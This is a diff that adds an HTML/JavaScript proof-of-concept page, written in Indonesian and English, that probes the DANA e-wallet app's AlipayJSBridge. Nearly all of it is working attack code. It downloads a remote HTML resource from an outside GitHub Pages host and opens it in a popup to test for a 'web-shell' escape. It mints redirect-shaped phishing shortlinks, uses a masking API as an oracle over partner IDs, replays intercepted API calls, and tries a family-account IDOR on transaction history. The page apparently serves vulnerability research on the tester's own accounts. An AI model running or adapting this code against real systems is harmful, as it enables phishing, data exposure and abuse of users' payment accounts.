@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v13</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px;margin:0;padding-top:24px}
+  h3{color:#ff0;margin:14px 0 4px;font-size:13px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:220px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:14px;margin:8px 0;font-size:15px;width:100%;font-weight:bold}
+  button.mini{width:auto;padding:6px 10px;font-size:11px;background:#220;color:#ff0;border:1px solid #660;font-weight:normal}
+  button:disabled{background:#222;color:#666;border-color:#444}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:5px;font-size:11px;z-index:9}
+  .note{color:#0ff;margin:4px 0}
+  .warn{color:#f80;margin:4px 0}
+  input,textarea{width:96%;background:#000;color:#0ff;border:1px solid #660;padding:8px;font-size:12px;margin:2px 0 8px 0;font-family:monospace}
+  textarea{min-height:90px}
+</style>
+</head>
+<body>
+<div id="status">v13 boot...</div>
+<h3 style="color:#0ff">v13 - WEB-SHELL VERDICT (AUTO) + SHORTLINK F7 RE-CONFIRM</h3>
+<p class="warn">Semua input sekarang OPSIONAL. DISCONNECT HTTP Toolkit dulu, baru tap RUN. Popup akan kebuka SENDIRI di tengah run - LIHAT tulisan besarnya (BRIDGE: ADA / TIDAK).</p>
+
+<h3>[0] env</h3><pre id="p-0" class="pending">pending</pre>
+
+<p class="note">INPUT 1 (opsional) - partnerId buat oracle masking (max 3, koma):</p>
+<input id="inp-pids" placeholder="contoh: 2166020242494729">
+<p class="note">INPUT 2 (opsional) - userId akun DANA kedua MILIKMU (family self-IDOR):</p>
+<input id="inp-uid2" placeholder="216610000xxxxxxxxxx">
+<p class="note">INPUT 3+4 (opsional, PALING BERHARGA): dengan Toolkit MASIH ON, buka mini-program apa pun, cari POST ke mgs.dana.id yang body-nya ada "operationType" dan hasilnya MENGEMBALIKAN DATA (query/get/list - mis. saldo, promo, profil). Copy operationType ke INPUT 3, payload/body ke INPUT 4. JANGAN op transfer/pay/refund!</p>
+<input id="inp-ot" placeholder="operationType, contoh: id.dana.xxx.yyy.query">
+<textarea id="inp-json" placeholder='payload JSON hasil intercept'></textarea>
+
+<button id="btn2" onclick="runPhase2()">&#9654; RUN PHASE 2 (Toolkit OFF dulu)</button>
+
+<h3>[1] netcheck</h3><pre id="p-1" class="pending">pending</pre>
+<h3>[2] downloadFile resource-v13 + fetch (hosting primitive)</h3><pre id="p-2" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-2')">copy</button>
+<h3>[3] iframe srcdoc render-escape (control)</h3><pre id="p-3" class="pending">pending</pre>
+<h3>[4] POPUP blob render-escape - AUTO CAPTURE (web-shell verdict)</h3><pre id="p-4" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-4')">copy</button>
+<h3>[5] shortlink CONTROL m.dana.id path+query bebas (F7)</h3><pre id="p-5" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-5')">copy</button>
+<h3>[6] shortlink REDIRECT-SHAPED ?next= (F7 phishing shape)</h3><pre id="p-6" class="pending">pending</pre>
+<h3>[7] shortlink apFilePath CHAIN (retry v12 003)</h3><pre id="p-7" class="pending">pending</pre>
+<h3>[8] shortlink a.m.dana.id (whitelist map)</h3><pre id="p-8" class="pending">pending</pre>
+<h3>[9] masking x pids (oracle)</h3><pre id="p-9" class="pending">pending</pre>
+<h3>[10] invoke REPLAY op asli (kalau isi INPUT 3+4)</h3><pre id="p-10" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-10')">copy</button>
+<h3>[11] trx family [uid2] (kalau isi INPUT 2)</h3><pre id="p-11" class="pending">pending</pre>
+
+<button onclick="copyAll()">COPY ALL RESULTS (compact)</button>
+<button class="mini" onclick="openPopupAgain()" style="width:100%;padding:10px">[18] BUKA POPUP LAGI (lihat tulisan besar BRIDGE: ADA/TIDAK + tap COPY di popup kalau perlu)</button>
+<button class="mini" onclick="openShortlink()" style="width:100%;padding:10px">[19] BUKA SHORTLINK hasil mint - lihat muncul apa (back lalu laporkan)</button>
+<button class="mini" onclick="openShortlinkAp()" style="width:100%;padding:10px">[20] BUKA SHORTLINK apFilePath (kalau [7] sukses) - lihat muncul apa</button>
+
+<script>
+(function(){
+  var RESULTS = {};
+  var LOG = [];
+  var running = false;
+  var attempt = 0;
+  var OP_MASKING = 'id.dana.minitunnel.user.info.masking';
+  var PAGES = 'https://rfypych.github.io/poc';
+  var TXN_OP = /(transfer|refund|withdraw|topup|cashier|sendmoney|createorder|paymentorder)/i;
+  var lastAp = null;
+  var lastApText = null;
+  var lastShort = null;
+  var lastShortAp = null;
+  var blobUrl = null;
+
+  function compact(o){
+    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
+  }
+  function set(id, obj, cls){
+    var el = document.getElementById(id);
+    el.className = cls || 'ok';
+    var txt;
+    try { txt = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 1); } catch(e) { txt = String(obj); }
+    if (txt && txt.length > 1800) txt = txt.slice(0,1800) + '...TRUNC';
+    el.textContent = txt;
+    RESULTS[id] = obj;
+  }
+  var statusEl = document.getElementById('status');
+  function status(t){ statusEl.textContent = t; }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    var fired = false;
+    var go = function(){ if (!fired){ fired = true; cb(); } };
+    document.addEventListener('AlipayJSBridgeReady', go, false);
+    setTimeout(go, 5000);
+  }
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done = false;
+      var t = setTimeout(function(){ if(!done){ done = true; resolve({__timeout:true, waitedMs:timeoutMs||15000}); } }, timeoutMs || 15000);
+      try {
+        window.AlipayJSBridge.call(api, param || {}, function(r){
+          if (!done) { done = true; clearTimeout(t); resolve(r); }
+        });
+      } catch(e) {
+        if (!done) { done = true; clearTimeout(t); resolve({__exception:String(e)}); }
+      }
+    });
+  }
+  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+  function getPids(){
+    var raw = (document.getElementById('inp-pids').value || '').trim();
+    if (!raw) return [];
+    return raw.split(/[\s,;]+/).filter(Boolean).slice(0,3);
+  }
+  function getUid2(){
+    return (document.getElementById('inp-uid2').value || '').trim();
+  }
+  function parseInvokeInput(){
+    var ot = (document.getElementById('inp-ot').value || '').trim();
+    var raw = (document.getElementById('inp-json').value || '').trim();
+    if (!ot && !raw) return null;
+    if (!raw) return {skipped:'payload JSON kosong'};
+    var obj;
+    try { obj = JSON.parse(raw); } catch(e){ return {parseError:String(e).slice(0,100)}; }
+    if (obj && typeof obj === 'object' && typeof obj.operationType === 'string' && obj.payload && typeof obj.payload === 'object'){
+      return {mode:'unwrapped', operationType:obj.operationType, payload:obj.payload};
+    }
+    if (!ot) return {skipped:'operationType kosong'};
+    return {mode:'asIs', operationType:ot, payload:obj};
+  }
+  function blobOf(){
+    if (blobUrl) return blobUrl;
+    if (!lastApText) return null;
+    try { blobUrl = URL.createObjectURL(new Blob([lastApText], {type:'text/html'})); } catch(e){ return null; }
+    return blobUrl;
+  }
+  async function iframeSrcdoc(){
+    if (!lastApText) return {skipped:'no resource text'};
+    var ifr = document.createElement('iframe');
+    ifr.style.cssText = 'width:12px;height:12px;opacity:0.05;position:fixed;bottom:0;left:0';
+    var out = {mode:'srcdoc'};
+    try { ifr.srcdoc = lastApText; } catch(e){ return {mode:'srcdoc', err:String(e).slice(0,80)}; }
+    document.body.appendChild(ifr);
+    await sleep(4000);
+    try {
+      var w = ifr.contentWindow;
+      out.marker = (w && w.__v13res) ? String(w.__v13res).slice(0,60) : null;
+      out.rendered = !!out.marker;
+      out.bridgeInIframe = !!(w && w.AlipayJSBridge);
+      try { out.iframeOrigin = w.location.origin; } catch(e){ out.iframeOrigin = 'inaccessible'; }
+    } catch(e){ out.crossOrigin = String(e).slice(0,80); }
+    try { document.body.removeChild(ifr); } catch(e){}
+    return out;
+  }
+
+  window.copyBlock = function(id){
+    var ta = document.createElement('textarea');
+    ta.value = id + ': ' + compact(RESULTS[id]);
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied ' + id); } catch(e) { status('copy failed'); }
+    document.body.removeChild(ta);
+  };
+  window.copyAll = function(){
+    var lines = [];
+    lines.push('v13 @ ' + location.href);
+    lines.push('log: ' + compact(LOG));
+    lines.push('inputs: ' + compact({pids:getPids(), uid2:getUid2(), ot:(document.getElementById('inp-ot').value||'').trim(), jsonLen:(document.getElementById('inp-json').value||'').length}));
+    for (var k = 0; k <= 11; k++) {
+      var id = 'p-' + k;
+      if (RESULTS[id] !== undefined) {
+        var s = compact(RESULTS[id]);
+        if (s.length > 2000) s = s.slice(0,2000) + '...CUT';
+        lines.push(id + ': ' + s);
+      }
+    }
+    var ta = document.createElement('textarea');
+    ta.value = lines.join('\n');
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied - paste it back'); } catch(e) { status('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+
+  function netcheck(){
+    var t0 = Date.now();
+    var rel = fetch('ping.txt?cb=' + Date.now(), {cache:'no-store'})
+      .then(function(r){ return {ok:true, http:r.status, ms:Date.now()-t0}; })
+      .catch(function(e){ return {ok:false, err:String(e).slice(0,60), ms:Date.now()-t0}; });
+    var abs = fetch(PAGES + '/ping.txt?cb=' + Date.now(), {mode:'no-cors', cache:'no-store'})
+      .then(function(){ return {noCors:true, ok:true}; })
+      .catch(function(e){ return {noCors:true, ok:false, err:String(e).slice(0,60)}; });
+    return Promise.all([rel, abs]).then(function(a){ return {relative:a[0], absoluteNoCors:a[1]}; });
+  }
+
+  window.openPopupAgain = function(){
+    var u = blobOf();
+    if (!u) { alert('belum ada teks resource dari [2] - jalankan phase 2 dulu'); return; }
+    var w = null;
+    try { w = window.open(u, '_blank'); } catch(e){}
+    status(w ? 'popup dibuka - baca tulisan besarnya' : 'popup gagal dibuka');
+  };
+  window.openShortlink = function(){
+    if (!lastShort) { alert('belum ada shortUrl sukses dari [5]/[6]'); return; }
+    location.href = lastShort;
+  };
+  window.openShortlinkAp = function(){
+    if (!lastShortAp) { alert('belum ada shortlink apFilePath sukses dari [7]'); return; }
+    location.href = lastShortAp;
+  };
+
+  async function popupCapture(){
+    if (!blobOf()) return {skipped:'no blob (butuh teks resource [2])'};
+    var msgs = [];
+    var gotFinal = false;
+    var listener = function(e){
+      try {
+        if (e && e.data && e.data.__v13popup){
+          msgs.push({origin:e.origin, stage:e.data.stage, data:compact(e.data.data).slice(0,500)});
+          if (e.data.stage === 'final') gotFinal = true;
+        }
+      } catch(err){}
+    };
+    window.addEventListener('message', listener, false);
+    var w = null;
+    try { w = window.open(blobOf(), '_blank'); } catch(e){}
+    var t0 = Date.now();
+    while ((Date.now() - t0) < 20000 && !gotFinal){
+      await sleep(500);
+    }
+    window.removeEventListener('message', listener, false);
+    var out = {opened:!!w, waitedMs:Date.now()-t0, msgs:(msgs.length ? msgs : null)};
+    var anyBridge = null;
+    for (var i = 0; i < msgs.length; i++){
+      if (msgs[i].data && msgs[i].data.indexOf('"hasBridge":true') !== -1) anyBridge = true;
+      if (msgs[i].data && msgs[i].data.indexOf('"hasBridge":false') !== -1) anyBridge = false;
+    }
+    out.popupBridge = anyBridge;
+    out.note = 'lihat popup: tulisan besar BRIDGE: ADA / TIDAK ADA di layar. Kalau ADA + data terbaca = WEB-SHELL TERKONFIRMASI.';
+    if (!msgs.length) out.note += ' (tidak ada postMessage dalam 20 dtk - baca layar popup / tap tombol COPY di popup lalu paste balik)';
+    return out;
+  }
+
+  window.runPhase2 = async function(){
+    if (running) return;
+    if (!window.AlipayJSBridge) { status('no bridge - cannot run phase 2'); return; }
+    running = true; attempt++;
+    var btn = document.getElementById('btn2');
+    btn.disabled = true;
+    var pids = getPids();
+    var uid2 = getUid2();
+    var inv = parseInvokeInput();
+    LOG.push({attempt:attempt, startedAt:new Date().toISOString(), pids:pids, uid2:uid2?'set':'empty', ot:inv&&inv.operationType?inv.operationType:(inv&&inv.parseError?'parse-error':(inv&&inv.skipped?'incomplete':'none'))});
+    try {
+      status('P2/' + attempt + ' [1] netcheck');
+      set('p-1', await netcheck());
+
+      status('P2/' + attempt + ' [2] downloadFile resource-v13 + fetch');
+      var dl = await call('downloadFile', {url:PAGES + '/resource-v13.html', filePath:'v13res.html', downloadTaskId:13}, 25000);
+      var f = {noApPath:true};
+      var ap = dl && (dl.apFilePath || dl.filePath);
+      if (ap && typeof ap === 'string'){
+        lastAp = ap;
+        try {
+          var r = await fetch(ap, {cache:'no-store'});
+          var tx = await r.text();
+          lastApText = tx;
+          f = {fetched:true, http:r.status, contentType:(r.headers && r.headers.get) ? r.headers.get('content-type') : '?', bytes:tx.length, bodyHead:tx.slice(0,100), apFilePath:ap};
+        } catch(e){ f = {fetched:false, err:String(e).slice(0,80), apFilePath:ap}; }
+      }
+      if (!lastApText){
+        try {
+          var r2 = await fetch(PAGES + '/resource-v13.html', {cache:'no-store'});
+          var tx2 = await r2.text();
+          lastApText = tx2;
+          f.githubFallback = {http:r2.status, bytes:tx2.length};
+        } catch(e){ f.githubFallback = {err:String(e).slice(0,60)}; }
+      }
+      set('p-2', {call:dl, fetchAp:f});
+      await sleep(800);
+
+      status('P2/' + attempt + ' [3] iframe srcdoc control');
+      set('p-3', await iframeSrcdoc());
+
+      status('P2/' + attempt + ' [4] POPUP blob - AUTO CAPTURE (tunggu ~20 dtk, jangan tutup popup-nya)');
+      set('p-4', await popupCapture());
+      await sleep(800);
+
+      status('P2/' + attempt + ' [5] shortlink CONTROL m.dana.id');
+      var s1 = await call('createShortLink', {url:'https://m.dana.id/v13ctl/path?poc=13&x=2'}, 20000);
+      set('p-5', s1);
+      if (s1 && s1.shortUrl) lastShort = s1.shortUrl;
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [6] shortlink REDIRECT-SHAPED');
+      var s2 = await call('createShortLink', {url:'https://m.dana.id/v13fake?next=https://example.com&poc=13'}, 20000);
+      set('p-6', s2);
+      if (s2 && s2.shortUrl) lastShort = s2.shortUrl;
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [7] shortlink apFilePath CHAIN retry');
+      if (lastAp){
+        var s3 = await call('createShortLink', {url:lastAp}, 20000);
+        set('p-7', s3);
+        if (s3 && s3.shortUrl){ lastShortAp = s3.shortUrl; lastShort = s3.shortUrl; }
+      } else { set('p-7', 'skipped - no apFilePath', 'err'); }
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [8] shortlink a.m.dana.id (whitelist map)');
+      var s4 = await call('createShortLink', {url:'https://a.m.dana.id/promo/generator-static-page/f-f-tebus-murah-1788773950034.html'}, 20000);
+      set('p-8', s4);
+      if (s4 && s4.shortUrl) lastShort = s4.shortUrl;
+      await sleep(800);
+
+      status('P2/' + attempt + ' [9] masking x pids');
+      if (pids.length){
+        var mres = {};
+        for (var i = 0; i < pids.length; i++){
+          mres[pids[i]] = await call('requestApi', {operationType:OP_MASKING, payload:{partnerId:pids[i]}}, 20000);
+          await sleep(600);
+        }
+        set('p-9', mres);
+      } else {
+        set('p-9', 'skipped - no partnerId input', 'err');
+      }
+
+      status('P2/' + attempt + ' [10] invoke REPLAY op asli');
+      if (!inv){ set('p-10', 'skipped - tidak ada input operationType/payload', 'err'); }
+      else if (inv.parseError){ set('p-10', inv, 'err'); }
+      else if (inv.skipped){ set('p-10', inv, 'err'); }
+      else if (TXN_OP.test(inv.operationType)){ set('p-10', {skipped:'operationType berbau TRANSAKSI - dilewati demi keamanan', op:inv.operationType}, 'err'); }
+      else {
+        set('p-10', await call('requestApi', {operationType:inv.operationType, payload:inv.payload}, 25000));
+      }
+
+      status('P2/' + attempt + ' [11] trx family [uid2]');
+      if (uid2){
+        set('p-11', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false, familyAccountMemberIds:[uid2]}, 25000));
+      } else {
+        set('p-11', 'skipped - no second-account userId input', 'err');
+      }
+
+      LOG.push({attempt:attempt, finishedAt:new Date().toISOString(), note:'phase2 complete', lastAp:lastAp, lastShort:lastShort, lastShortAp:lastShortAp, resTextBytes:lastApText?lastApText.length:0});
+      status('DONE P2 attempt ' + attempt + ' - COPY ALL, lalu optional [18]-[20]');
+    } catch(e) {
+      status('phase2 error: ' + String(e).slice(0,60));
+    }
+    running = false;
+    btn.disabled = false;
+    btn.innerHTML = '&#8635; RE-RUN PHASE 2';
+  };
+
+  bridgeReady(function(){
+    if (!window.AlipayJSBridge){
+      set('p-0', {noBridge:true, href:location.href, ua:navigator.userAgent.slice(0,80)}, 'err');
+      status('NO BRIDGE (browser?) - open inside DANA container');
+      return;
+    }
+    var sp = {};
+    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
+    set('p-0', {hasBridge:true, appId:sp.appId, startScene:sp.startScene||sp.scene, href:location.href.slice(0,100)});
+    LOG.push({phase1Done:new Date().toISOString()});
+    status('PHASE 1 DONE - disconnect toolkit, isi input (opsional), RUN PHASE 2');
+  });
+})();
+</script>
+</body>
+</html>
